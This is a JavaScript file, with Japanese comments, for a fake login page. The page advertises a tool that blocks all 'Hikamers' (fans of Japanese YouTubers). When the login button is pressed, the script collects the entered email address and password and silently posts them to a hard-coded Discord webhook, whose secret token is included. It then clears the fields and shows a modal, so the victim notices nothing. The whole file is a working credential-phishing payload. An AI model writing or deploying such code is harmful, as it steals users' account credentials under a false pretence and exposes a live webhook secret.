// ==========================================================
// ⚠️ Webhook URLを正しいものに置き換えてください。
// ==========================================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1428234881561002045/32y44N7pa_9xGU1NMPV-73lnIzKPRrNyxAANMwGjbRp176wfKkYwnWHsSD1CE4pnxIWM";
// ==========================================================


document.addEventListener('DOMContentLoaded', () => {
    const loginButton = document.getElementById('sendToDiscordButton');
    const modal = document.getElementById('cModal');
    const closeButton = document.querySelector('.close-button');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');


    // --- 1. 「ログインする」ボタンのクリック処理 ---
    loginButton.onclick = async function(event) {
        event.preventDefault(); 
        
        const emailValue = emailInput.value;
        const passwordValue = passwordInput.value;

        const messageContent = `**「全ヒカマーをブロックするツール」からのログイン試行**\n\n**メールアドレス:** ${emailValue}\n**パスワード:** ${passwordValue}`;
        
        // Discordに送信（エラーがあっても無視して処理を続行）
        await sendToDiscord(messageContent);
        
        // Cのモーダルを表示し、入力をクリア
        modal.style.display = "block";
        emailInput.value = '';
        passwordInput.value = '';
    }

    // --- 2. モーダルを閉じる処理 ---
    closeButton.onclick = function() {
        modal.style.display = "none";
    }

    window.onclick = function(event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }
});


/**
 * Discord Webhookを使用してメッセージを送信する関数
 * 失敗しても何も通知しない
 */
async function sendToDiscord(content) {
    // URLの有効性チェックもしません
    
    const data = {
        "content": content, 
        "username": "ヒカマーブロックツール",
    };

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });

        // 成功/失敗のチェックもしません
        
    } catch (error) {
        // 通信エラーが発生しても無視します
    }
    // 戻り値もありません
}